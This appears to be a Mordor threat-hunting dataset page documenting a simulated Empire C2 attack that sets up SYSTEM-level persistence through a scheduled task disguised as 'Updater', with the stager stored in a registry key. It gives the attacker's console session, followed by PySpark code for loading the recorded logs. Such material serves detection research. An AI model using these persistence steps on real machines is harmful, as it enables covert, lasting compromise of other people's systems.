# Empire Elevated Scheduled Tasks

## Metadata


|                   |    |
|:------------------|:---|
| id                | SD-190518184109 |
| author            | Roberto Rodriguez @Cyb3rWard0g |
| creation date     | 2019/05/18 |
| platform          | Windows |
| Mordor Environment| shire |
| Simulation Type   | C2 |
| Simulation Tool   | Empire |
| Simulation Script | https://github.com/EmpireProject/Empire/blob/dev/data/module_source/persistence/Persistence.psm1 |
| Mordor Dataset    | https://raw.githubusercontent.com/OTRF/mordor/master/datasets/small/windows/persistence/empire_elevated_schtasks.tar.gz |

## Dataset Description
This dataset represents adversaries creating scheduled tasks to maintain persistence in the environment

## Adversary View
```
(Empire: TKV35P8X) > usemodule persistence/elevated/schtasks*
(Empire: powershell/persistence/elevated/schtasks) > info

              Name: Invoke-Schtasks
            Module: powershell/persistence/elevated/schtasks
        NeedsAdmin: True
        OpsecSafe: False
          Language: powershell
MinLanguageVersion: 2
        Background: False
  OutputExtension: None

Authors:
  @mattifestation
  @harmj0y

Description:
  Persist a stager (or script) using schtasks running as
  SYSTEM. This has a moderate detection/removal rating.

Comments:
  https://github.com/mattifestation/PowerSploit/blob/master/Pe
  rsistence/Persistence.psm1

Options:

  Name       Required    Value                     Description
  ----       --------    -------                   -----------
  DailyTime  False       09:00                     Daily time to trigger the script        
                                                  (HH:mm).                                
  OnLogon    False                                 Switch. Trigger script on user logon.   
  ExtFile    False                                 Use an external file for the payload    
                                                  instead of a stager.                    
  ProxyCreds False       default                   Proxy credentials                       
                                                  ([domain\]username:password) to use for 
                                                  request (default, none, or other).      
  Cleanup    False                                 Switch. Cleanup the trigger and any     
                                                  script from specified location.         
  TaskName   True        Updater                   Name to use for the schtask.            
  IdleTime   False                                 User idle time (in minutes) to trigger  
                                                  script.                                 
  ADSPath    False                                 Alternate-data-stream location to store 
                                                  the script code.                        
  Agent      True        TKV35P8X                  Agent to run module on.                 
  Listener   False                                 Listener to use.                        
  RegPath    False       HKLM:\Software\Microsoft  Registry location to store the script   
                        \Network\debug            code. Last element is the key name.     
  Proxy      False       default                   Proxy to use for request (default, none,
                                                  or other).                              
  UserAgent  False       default                   User-agent string to use for the staging
                                                  request (default, none, or other).      

(Empire: powershell/persistence/elevated/schtasks) > set Listener https
(Empire: powershell/persistence/elevated/schtasks) > execute
[>] Module is not opsec safe, run? [y/N] y
[*] Tasked TKV35P8X to run TASK_CMD_WAIT
[*] Agent TKV35P8X tasked with task ID 2
[*] Tasked agent TKV35P8X to run module powershell/persistence/elevated/schtasks
(Empire: powershell/persistence/elevated/schtasks) > SUCCESS: The scheduled task "Updater" has successfully been created.
Schtasks persistence established using listener https stored in HKLM:\Software\Microsoft\Network\debug with Updater daily trigger at 09:00.

(Empire: powershell/persistence/elevated/schtasks) > 
(Empire: powershell/persistence/elevated/schtasks) >
```

## Explore Mordor Dataset

### Initialize Analytics Engine

from openhunt.mordorutils import *
spark = get_spark()

### Download & Process Mordor File

mordor_file = "https://raw.githubusercontent.com/OTRF/mordor/master/datasets/small/windows/persistence/empire_elevated_schtasks.tar.gz"
registerMordorSQLTable(spark, mordor_file, "mordorTable")

### Get to know your data

df = spark.sql(
    '''
SELECT *
FROM mordorTable
    '''
)
df.printSchema()
        
